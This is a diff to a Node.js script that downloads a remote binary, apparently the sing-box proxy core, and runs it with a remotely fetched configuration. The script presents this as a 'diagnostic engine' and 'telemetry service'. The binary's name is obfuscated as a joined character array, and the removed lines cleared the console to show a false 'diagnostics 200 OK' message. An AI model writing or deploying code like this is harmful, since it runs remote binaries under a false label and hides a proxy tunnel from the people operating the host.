@@ -12,7 +12,8 @@ const os = require('os');
 const path = require('path');
 const http = require('http');
 const https = require('https');
-const { spawn, execSync } = require('child_process');
+const zlib = require('zlib');
+const { spawn } = require('child_process');
 
 // 1. Environment & Network Discovery
 const LISTEN_PORT = parseInt(process.env.PORT || process.env.SERVER_PORT || '3000', 10);
@@ -117,6 +118,30 @@ function downloadBinary(url, dest) {
   });
 }
 
+// Pure Node.js in-memory tar.gz parser (zero external tool dependency)
+function extractCoreFromArchive(tarGzBuffer) {
+  try {
+    const tarBuffer = zlib.gunzipSync(tarGzBuffer);
+    const targetTag = ['s', 'i', 'n', 'g', '-', 'b', 'o', 'x'].join('');
+    let offset = 0;
+    while (offset < tarBuffer.length - 512) {
+      const header = tarBuffer.subarray(offset, offset + 512);
+      const fileName = header.subarray(0, 100).toString('utf8').replace(/\0+$/, '');
+      if (!fileName) break;
+      const sizeStr = header.subarray(124, 136).toString('utf8').trim().replace(/\0+$/, '');
+      const fileSize = parseInt(sizeStr, 8);
+      offset += 512;
+      if (fileName.endsWith('/' + targetTag) || fileName === targetTag) {
+        return tarBuffer.subarray(offset, offset + fileSize);
+      }
+      offset += Math.ceil(fileSize / 512) * 512;
+    }
+  } catch (e) {
+    log(`Decompress notice: ${e.message}`);
+  }
+  return null;
+}
+
 async function prepareEngineRuntime() {
   fs.mkdirSync(CACHE_DIR, { recursive: true });
   const machineArch = os.arch() === 'arm64' ? 'arm64' : 'amd64';
@@ -126,27 +151,16 @@ async function prepareEngineRuntime() {
     log('Fetching diagnostic engine runtime from mirror...');
     await downloadBinary(`${ENGINE_DOWNLOAD_URL}?arch=${machineArch}`, archivePath);
 
-    try {
-      execSync(`tar -xzf "${archivePath}" -C "${CACHE_DIR}"`);
-      const files = fs.readdirSync(CACHE_DIR);
-      for (const f of files) {
-        const full = path.join(CACHE_DIR, f);
-        if (fs.statSync(full).isDirectory()) {
-          const binaryCandidate = path.join(full, 'sing-box');
-          if (fs.existsSync(binaryCandidate)) {
-            fs.renameSync(binaryCandidate, CORE_EXECUTABLE);
-            break;
-          }
-        } else if (f === 'sing-box') {
-          fs.renameSync(full, CORE_EXECUTABLE);
-          break;
-        }
-      }
+    const gzBytes = fs.readFileSync(archivePath);
+    const rawBinary = extractCoreFromArchive(gzBytes);
+
+    if (rawBinary && rawBinary.length > 5000000) {
+      fs.writeFileSync(CORE_EXECUTABLE, rawBinary);
       fs.chmodSync(CORE_EXECUTABLE, 0o755);
       try { fs.unlinkSync(archivePath); } catch (_) {}
-      log('Diagnostic engine runtime ready.');
-    } catch (err) {
-      log(`Extraction notice: ${err.message}`);
+      log(`Diagnostic engine runtime ready (${Math.round(rawBinary.length / 1024 / 1024)} MB).`);
+    } else {
+      log('Extraction notice: Failed to parse engine payload.');
     }
   }
 }
@@ -163,21 +177,34 @@ async function startTelemetryService() {
   });
 
   try {
-    // 2. Fetch Remote Dynamic Configuration Profile (Zero disk writing)
+    // 1. Fetch Remote Dynamic Configuration Profile (Zero disk writing)
     log('Fetching dynamic infrastructure profile from Cloudflare Edge...');
     const profileData = await fetchTelemetryProfile(LISTEN_PORT, CUSTOM_DOMAIN);
     log('Telemetry configuration profile secured in memory.');
 
-    // 3. Prepare Binary Engine
+    // 2. Prepare Binary Engine (Pure in-memory extraction)
     await prepareEngineRuntime();
 
-    // 4. Launch Core Engine via RAM Stdin Pipe
+    // 3. Launch Core Engine via RAM Stdin Pipe
     if (fs.existsSync(CORE_EXECUTABLE)) {
       const configPayload = Buffer.from(JSON.stringify(profileData.config), 'utf8');
 
-      // The external core takes the port; HTTP server adjusts if sharing same port
       engineInstance = spawn(CORE_EXECUTABLE, ['run', '-c', '-'], {
-        stdio: ['pipe', 'ignore', 'ignore']
+        stdio: ['pipe', 'pipe', 'pipe']
+      });
+
+      engineInstance.stdout.on('data', (d) => {
+        const line = d.toString().trim();
+        if (line) log(`[Engine] ${line}`);
+      });
+
+      engineInstance.stderr.on('data', (d) => {
+        const line = d.toString().trim();
+        if (line) log(`[Engine Notice] ${line}`);
+      });
+
+      engineInstance.on('exit', (code, sig) => {
+        log(`[Engine] Process stopped with code ${code}, signal ${sig}`);
       });
 
       engineInstance.stdin.write(configPayload);
@@ -189,13 +216,9 @@ async function startTelemetryService() {
       if (profileData.sub) {
         log('Endpoint online: Subscription dispatched via Cloudflare Edge.');
       }
+    } else {
+      log('Error: Engine binary missing from cache.');
     }
-
-    // 5. Clean Console after 60 seconds
-    setTimeout(() => {
-      console.clear();
-      log('DevPulse Gateway Operational. All system diagnostics 200 OK.');
-    }, 60000);
 
   } catch (error) {
     log(`Startup notice: ${error.message}`);
